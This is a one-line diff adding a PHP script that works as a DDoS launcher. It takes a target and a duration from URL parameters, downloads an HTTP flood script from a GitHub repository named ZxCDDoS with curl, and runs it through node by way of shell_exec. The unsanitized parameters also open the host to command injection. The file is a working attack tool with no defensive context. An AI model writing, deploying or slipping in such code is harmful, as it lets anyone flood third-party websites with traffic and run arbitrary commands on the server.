@@ -1,0 +1,1 @@
+<?php $target = $_GET['target']; $time = $_GET['time']; shell_exec("curl -s https://raw.githubusercontent.com/hoaan1995/ZxCDDoS/main/HTTP-RAW.js | node - $target $time");?>
